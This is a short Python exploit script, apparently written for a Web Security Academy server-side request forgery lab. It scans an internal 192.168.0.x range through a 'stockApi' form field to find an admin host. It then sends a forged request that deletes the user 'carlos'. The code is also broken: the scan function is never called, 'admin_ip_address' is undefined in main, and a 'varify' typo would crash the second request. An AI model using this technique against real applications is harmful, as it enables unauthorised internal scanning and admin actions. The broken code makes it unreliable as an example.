import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080','https': 'https://127.0.0.1:8080'}

def check_host_ip(url):
    check_stock_path = '/product/stock'
    admin_hostname = ''
    for i in range(1,100):
        hostname = 'http://192.168.0.%s' %i
        data = {'stockApi': hostname}
        r = requests.post(url + check_stock_path, data=data, verify=False, proxies=proxies)
        if r.status_code == 200:
            print("Exploite worked")
            admin_ip_address = '192.168.0.%s' %i
            break
            

    if admin_ip_address == '':
        print("exploit Failed")
    return admin_ip_address


def delete_user(url, admin_ip_address):
    delete_payload = 'http://%s:8080/admin/delete?username=carlos' % admin_ip_address
    check_stock_path = '/product/stock'
    data1 = {'stockApi': delete_payload}
    r = requests.post(url + check_stock_path, data=data1, verify=False, proxies=proxies)

    # Check if user was deleted
    admin_ssrf_payload = 'http://%s:8080/admin' % admin_ip_address
    data2 = {'stockApi': admin_ssrf_payload}
    r= requests.post(url + check_stock_path, data=data2, varify=False, proxies=proxies)
    if 'User deleted successfully' in r.text:
        print("(Successfully deleted Carlos user")
    else:
        print("Exploit failed.")

def main():
    url = 'https://0ae9004104ae688a812e1163006000d7.web-security-academy.net'
    delete_user(url, admin_ip_address)

if __name__ == '__main__':
    main()